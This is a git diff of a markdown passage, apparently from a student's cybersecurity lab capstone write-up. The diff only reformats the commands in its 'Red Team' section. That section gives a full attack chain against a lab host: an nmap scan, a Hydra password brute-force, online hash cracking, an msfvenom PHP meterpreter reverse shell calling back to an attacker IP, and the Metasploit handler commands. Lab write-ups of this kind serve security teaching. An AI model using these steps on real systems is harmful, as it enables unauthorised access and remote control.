@@ -7,32 +7,32 @@ I created mitigation measures for each exploit that I've successfully performed.
 ## Red Team
 
 
--	I ran the command ifconfig to find the IP address of the capstone machine, which was the machine we were attacking.
+-	I ran the command ***ifconfig*** to find the IP address of the capstone machine, which was the machine we were attacking.
 
--	I then ran a Nmap command nmap -sV 192.168.1.105 to find the open ports
+-	I then ran a Nmap command ***nmap -sV 192.168.1.105*** to find the open ports
 
 -	I then went into the website to see to find any important directories. I was able to find a hidden directory at 192.168.1.105/company_folders/secret_folder that you need to login into as Ashton.
 
--	On the Kali machine, I ran the Hydra tool with the command hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get http://192.168.1.105/company_folders/secret_folder on it that used brute force into the wordlist and found the password for it.
+-	On the Kali machine, I ran the Hydra tool with the command ***hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get http://192.168.1.105/company_folders/secret_folder*** on it that used brute force into the wordlist and found the password for it.
 
 -	I then logged into the secret folder and found a personal note in it.
 
 -	After reading the personal note, I copied the hashed text that was was left for Ryan's account and put it on https://crackstation.net/ and cracked it on the website.
 
 
--	Now that I have username and password for Ryan, I can now create my php shell to put on their website. I did so by doing this command msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.90 LPORT=80 -f raw > shell.php
+-	Now that I have username and password for Ryan, I can now create my php shell to put on their website. I did so by doing this command ***msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.90 LPORT=80 -f raw > shell.php***
 
 -	I then uploaded the shell into the webdav directory.
 
 -	I then ran Metasploit to listen to the shell on the target machine, so I can access it via remote. The commands I ran were:
 
-	-	Msfconsole
-	-	use exploit/multi/handler
-	-	Set payload php/meterpreter/reverse_tcp
-	-	set LHOST 192.168.1.90
-	-	set LPORT 80
-	-	show options
-	-	run
+	-	***msfconsole***
+	-	***use exploit/multi/handler***
+	-	***set payload php/meterpreter/reverse_tcp***
+	-	***set LHOST 192.168.1.90***
+	-	***set LPORT 80***
+	-	***show options***
+	-	***run***
 
 -	I then clicked on the shell on the website after I ran the Metasploit and I was able now to now get remote access to the target machine.
 
